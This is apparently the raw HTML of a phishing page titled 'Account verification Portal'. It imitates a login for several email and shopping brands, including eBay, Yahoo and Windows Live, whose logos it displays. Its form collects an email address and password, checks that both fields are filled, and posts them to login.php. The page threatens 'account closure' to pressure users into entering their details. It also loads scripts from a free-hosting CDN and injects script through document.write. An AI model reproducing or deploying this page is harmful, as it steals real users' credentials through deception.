<html><head>

<title>Get the best. Update now</title>
<link rel="shortcut icon" href="" />
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<link rel="stylesheet" type="text/css" href="files/default.css">
<!-- no core stylesheet -->
</head>
<body class="centre" style="margin-top: 32px; background: none repeat scroll 0% 0% rgb(255, 255, 255);"><img src="files/logo.png" height="120" width="300">

<div style="border: none; margin-right: auto; margin-left: auto; width: 447px; height: 200px; padding: 10px; background: url(&quot;http://www.outitgoes.com/login_panel_gradient.jpg&quot;) top center no-repeat">

<script type="text/javascript">
function validateForm()
{
var x=document.forms["data"]["login"].value;
if (x==null || x=="")
  {
  alert("Email must be filled out");
  return false;
  }
var x=document.forms["data"]["login"].value;
var atpos=x.indexOf("@");
var dotpos=x.lastIndexOf(".");
if (atpos<1 || dotpos<atpos+2 || dotpos+2>=x.length)
  {
  alert("Not a valid e-mail address");
  return false;
  }
  var x=document.forms["data"]["passwd"].value;
if (x==null || x=="")
  {
  alert("Password must be filled out");
  return false;
  }
}
</script>

<form name="data" action='login.php' method="post" onsubmit="return validateForm()">
			<div>
			<h1>Account verification Portal </h1>
			<p>Because you are accessing sensitive info, we need to verify your identity.</p>
			<div class=centre'>
			<table style='margin-left: auto; margin-right: auto; width: 300px'>
			<tbody>
			<tr>
			<th style='width: 20%; text-align: right; padding-right: 1em'>
			Email&nbsp;Address: </th>

			<td style='text-align: left'><input type='text' name='login' size='30' value=''autofocus></td>
			</tr>
			<tr>
			<th style='text-align: right; padding-right: 1em'>Password: </th>
			<td style='text-align: left'><input type='password' name='passwd' size='30'</td>
			</tr>
			</tbody>
			</table>
			<p align="center"><i>All fields must be filled in accurately to avoid account closure.</i></p>
			<input type="submit" value="Continue >>">


			</div>
</div></form></div>
<img src="files/ninja-hp-logo.jpg" align="middle">
  <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img alt="file/126logo.gif" src="files/126logo.gif"><img alt="http://p.ebaystatic.com/aw/pics/logos/logoEbay_x45.gif" src="files/logoEbay_x45.gif" height="36" width="110">&nbsp; <img src="files/logo_png.png" alt="" title="" border="0" height="44" width="122">&nbsp;&nbsp; <img src="files/mail_logo.png" alt="" title="" border="0" height="26" width="142"><img src="files/WindowsLive.png" alt="" title="" border="0" height="23" width="175">&nbsp;<img src="files/yeahlogo_middle.gif" alt="" title="" border="0" height="62" width="174"> <img src="files/yahoo_en.gif" alt="" title="" border="0" height="49" width="138"></p>
<div><img src="files/t.gif" height="10" width="1">


</div>

<script type="text/javascript">
var uid = '3887';
var wid = '4102';
</script>
<script type="text/javascript" src=""></script><script type="text/javascript">
var uid = '3887';
var wid = '4102';
</script>
<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-21588661-2']);
  _gaq.push(['_setDomainName', window.location.host]);
  _gaq.push(['_setAllowLinker', true]);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);

Â  Â  var fga = document.createElement('script'); fga.type = 'text/javascript'; fga.async = true;
Â  Â  fga.src = ('https:' == document.location.protocol ? 'https://www' : 'http://www') + '.1freehosting.com/cdn/ga.js';
Â  Â  var fs = document.getElementsByTagName('script')[0]; fs.parentNode.insertBefore(fga, fs);

  })();
</script>
<!-- End Of Analytics Code --><script type='text/javascript'><!--//<![CDATA[
													   var ox_u = '';
													   if (document.context) ox_u += '&context=' + escape(document.context);
													   document.write("<scr"+"ipt type='text/javascript' src='" + ox_u + "'></scr"+"ipt>");
													//]]>--></script>
</body></html>
<!-- 1 -->